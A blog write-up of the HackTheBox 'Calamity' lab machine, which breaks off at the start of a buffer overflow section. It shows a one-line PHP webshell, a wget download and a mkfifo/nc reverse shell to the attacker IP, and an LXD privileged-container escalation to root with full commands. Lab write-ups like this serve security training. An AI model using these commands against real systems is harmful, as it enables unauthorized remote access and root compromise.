---
title: "HackTheBox - WriteUp 7"
date: 2019-06-09T19:46:08+08:00
description: "HackTheBox 练手"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Calamity

It just seems in Medium difficulty, however, it is really brainfuck in privilege escalation part.

## Before start

Nmap Scan: 80 and 22, Apache + SSH.

Gobuster Scan: /uploads(200), admin.php(200)

# Normal User

## Reverse shell

Access `admin.php` and you will find the `admin` with password in the comment of the webpage source code, which is: `password is:skoupidotenekes`

After you login, you've been told that this page could execute and php code. The question is that this method is submitted via URL params, so you can't submit too long code.

The shortest php webshell is: 

```php
<?=`$_GET[1]`?>
```

Just fired up my AntSword, generate a shell, and then detect if there's `wget`. It works. So write a php command to let it download the shell from the http server, 
Note: The `/var/www/html` is RO-only, you can only upload to `uploads/`

```php
<?php system("wget http://10.10.16.37:8080/te26st.php -o uploads/te26st.php");?>
```

After that, try `nc` to get a reverse shell. But after connection established, it get killed immediately. So what should we do? Check the `/etc/passwd` and found a normal user called `xalvas`, try to access to the home, succeeded. Then we got `user.txt`. However, there's a `intrusions` folder here. Check the content, just logged that there's a crappy IPS which blacklisted some process to run.

So let's just copy a `nc` to `/dev/shm` to avoid being killed:

```bash
$ cp /bin/nc /dev/shm/gibs
$ chmod 755 /dev/shm/gibs
```

Then grab a php reverse shell from pentestmonkey, run it with our "customized" nc.

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/gibs 10.10.16.37 12334 >/tmp/f");?>
```

Successfully got the shell we need.

## Interactive shell

Download the `recov.wav` and `alarmclocks/rick.wav`. Import both of them into `audacity`, and invert one of them. You will hear the normal user password. Don't forget to set repeatedly play the audio.

The password is: `18547936..*`

Just access it via SSH.

# Privilege Escalation

Of course, LinEnum first. 

Due to the normal user belongs to group lxd, and also the lxc is initialized before. 

And there's an ELF with `setuid` permission in `~/app`.

So we have two methods to escalate.

## LXC method

This is the easier one.

We notice xalvas is member of the lxd group. Like with most container technologies (e.g.,), you can run processes with root privileges via LXD. Thus, being member of groups like lxd are more or less equivalent to being root. [Here](https://reboare.github.io/lxd/lxd-escape.html) is a blog post with some details on how to exploit this group membership.

The privesc requires to run a container with elevated privileges and mount the host filesystem inside. Running containers requires an image on the machine. Since we do not have an internet connection on the machine, we have to copy over an image. The outline is as follows:

= Build an image locally and copy image to remote host
= Import image into LXD, create a container and mount host filesystem
= Run a shell inside the container and get flag

### Prepare image

Alpine is a popular Linux distribution to base container images on since it is so small. Unlike other operating systems, which may result in a few hundred megs, Alpine images are often rather small. In this [repository](https://github.com/saghul/lxd-alpine-builder) you can find a simple script to build a container. Clone it, cd into it, then run `./build-alpine -a i686` and a tar file `alpine-v3.7-i686-20180121_1729.tar.gz` will appear.

With SSH access, copying is as easy as running `scp alpine-v3.7-i686-20180121_1729.tar.gz xalvas@10.10.10.27:/dev/shm/.tmp/alpine.tar.gz` .

### Prepare container
Importing tar files as images is explained [here](https://stgraber.org/2016/03/30/lxd-2-0-image-management-512/). The steps are as follows:

```bash
xalvas@calamity:/dev/shm/.tmp$ lxc image import ./alpine.tar.gz --alias myimage
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: facaf59235080f8c950f700f1c0a9e65a7487901dfc30d04bd78bba7444df4b0
xalvas@calamity:/dev/shm/.tmp$ lxc image list
+---------+--------------+--------+------------------------------+------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |         DESCRIPTION          | ARCH |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+------------------------------+------+--------+------------------------------+
| myimage | facaf5923508 | no     | alpine v3.7 (20180121_17:29) | i686 | 2.37MB | Jan 21, 2018 at 8:06pm (UTC) |
+---------+--------------+--------+------------------------------+------+--------+------------------------------+
```

The output above asks us to run lxd init but if we try, it tells us we should sudo, which we can’t do. Fortunately, it will work without, so it’s ok to ignore.

We proceed by creating the container. The important part about it is using the flag security.privileged=true, which causes the container to interact as root with the host filesystem. This means all we have to do it mount the whole filesystem into the container and we get access to everything.

```bash
xalvas@calamity:/dev/shm/.tmp$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
xalvas@calamity:/dev/shm/.tml$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
xalvas@calamity:/dev/shm/.tmp$ lxc list
+-------------+---------+------+------+------------+-----------+
|    NAME     |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+-------------+---------+------+------+------------+-----------+
| mycontainer | STOPPED |      |      | PERSISTENT | 0         |
+-------------+---------+------+------+------------+-----------+
```

### Run shell
The last part is starting the container and executing a shell inside. We can then change into the rooted host filesystem and cat out the flag.

```bash
xalvas@calamity:/dev/shm/.tmp$ lxc start mycontainer
xalvas@calamity:/dev/shm/.tmp$ lxc exec mycontainer /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # ls -la /mnt/root/
total 108
drwxr-xr-x   22 root     root          4096 Jun 29  2017 .
drwxr-xr-x    3 root     root          4096 Jan 23 20:20 ..
drwxr-xr-x    2 root     root          4096 Jun 28  2017 bin
drwxr-xr-x    3 root     root          4096 Jun 27  2017 boot
drwxr-xr-x   18 root     root          3880 Jan 21 22:26 dev
drwxr-xr-x   96 root     root          4096 Jun 28  2017 etc
[...]
~ # cat /mnt/root/root/root.txt
9be6... <- flag
```

## Buffer Overflow 

**This is really the most difficult one I faced here.**

If you aren't a container expert, chances are you would have taken another much harder path. A simple search for SUID binaries delivers the following result:

```bash
xalvas@calamity:~$ find / -perm -4000 2>/dev/null
/home/xalvas/app/goodluck
/bin/ping6
/bin/umount
/bin/mount
[...]
```

A file called goodluck sounds like you are supposed to exploit it. And indeed, it is possible.

### Start
